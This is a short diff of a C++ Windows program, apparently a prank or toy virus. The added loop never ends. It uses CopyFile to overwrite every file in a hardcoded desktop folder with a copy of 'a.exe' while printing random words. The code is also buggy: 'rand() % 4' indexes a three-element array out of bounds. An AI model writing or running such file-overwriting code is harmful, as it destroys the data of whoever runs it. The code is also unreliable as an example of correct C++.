@@ -6,7 +6,7 @@
 #include <windows.h>
 #include <fstream>
 #include <filesystem>
-namespace fs = std::exprimental::filesystem;
+#include <Windows.h>
 using namespace std;
 string sWords[] = {"Lol","Mitze","Katze"};
 string Chain = "";
@@ -14,17 +14,13 @@ string Chain = "";
 
 void printer()
 {
-	string File
-	for(int i=0; i>1;i=i+1){
-	    std::string path = "C:/Users/sack/Desktop/adsfdasf";
-	    for (const auto & entry : fs::directory_iterator(path)){
-	    	File = entry.path();
+	while(true){
+		std::string path = "C:/Users/sack/Desktop/adsfdasf";
+	    for (const auto & entry : std::filesystem::directory_iterator(path)){
+ 			CopyFile("./a.exe",entry.path().string().c_str(),0);
+	   		Chain = Chain + sWords[rand() % 4];
+			cout << Chain;
 	    }
-		fs::copy(fs::current_path+"mitze.exe",File);
-
-		Sleep(100);
-		Chain = Chain + sWords[rand() % 4];
-		cout << Chain;
 	}
 }
 int main()
